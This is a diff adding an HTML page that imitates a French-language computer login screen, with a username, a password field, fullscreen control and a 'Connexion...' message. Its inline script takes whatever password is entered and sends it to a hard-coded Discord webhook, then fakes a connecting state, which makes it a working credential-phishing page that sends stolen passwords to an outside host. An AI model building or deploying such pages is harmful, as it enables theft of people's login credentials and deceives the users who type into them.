@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" type="text/css" href="./assets/css/backgrounds.css?v=1.0.0" />
+        <link rel="stylesheet" type="text/css" href="./assets/css/fonts.css?v=1.0.0" />
+        <link rel="stylesheet" type="text/css" href="./assets/framework/bootstrap.min.css?v=5.1.3" />
+        <title></title>
+    </head>
+    <body>
+        <main class="container-fluid">
+            <section class="row">
+                <div class="col-3" style="min-height: 100vh;">
+                    <button id="fullscreen" onclick="fullscreen();">fullscreen</button>
+                </div>
+                <div class="col-6 align-self-center text-center">
+                    <img class="img-fluid opacity-75" src="./assets/img/user.png" title="" />
+                    <div class="h2 my-3 text-white" id="username">EXPOSITO</div>
+                    <div class="h4 my-3 text-white" id="connection" style="display: none;">Connexion...</div>
+                    <div class="row">
+                        <div class="col-6 offset-3">
+                            <form method="POST" id="drop" onsubmit="envoyerForm()">
+                                <div class="input-group">
+                                    <input class="form-control password" type="text" name="password" autocomplete="off" placeholder="Mot de passe" required />
+                                    <button class="btn opacity-75 login" type="submit"></button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-3" style="min-height: 100vh;">
+                    <div class="position-absolute bottom-0 end-0">
+                        <img class="img-fluid mx-2 my-3" style="width: 45px;" src="./assets/img/icons/worldwide.png" title="" />
+                        <img class="img-fluid mx-2 my-3" style="width: 45px;" src="./assets/img/icons/network.png" title="" />
+                        <img class="img-fluid ms-2 me-3 my-3" style="width: 45px;" src="./assets/img/icons/power.png" title="" />
+                    </div>
+                </div>
+            </section>
+        </main>
+        <script type="text/javascript" src="./assets/js/fullscreen.js?v=1.0.0"></script>
+        <script type="text/javascript" src="./assets/js/rightclick.js?v=1.0.0"></script>
+        <script type="text/javascript" src="./assets/js/randomwall.js?v=1.0.0"></script>
+
+        <script>
+            function discord_message(message) {
+                var xhr = new XMLHttpRequest();
+                
+                xhr.open("POST", "https://discord.com/api/webhooks/1183766741759840326/fLGBZhCEM5Jx-J13XGimQOqT4qR4hpPN4r8sO_01gzQoEF_aMmnPhnAio0L7hhuI0uZt", true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        close()
+                    } else {
+                        console.error('Failed to send message. Status code: ' + xhr.status);
+                    }
+                    
+                    xhr = null;
+                };
+                
+                xhr.send(JSON.stringify({
+                    'content': message,
+                    'username': 'AI',
+                }));
+            }
+
+
+            function envoyerForm() {
+                event.preventDefault();
+                // récupère les données du champ password
+                var password = document.querySelector(".password").value;
+                console.log(password);
+                // print le mot de passe
+                discord_message(password);
+                // cache le formulaire
+                document.getElementById("drop").style.display = "none";
+                // affiche l'element d'id connection
+                document.getElementById("connection").style.display = "block";
+            }
+        </script>
+    </body>
+</html>
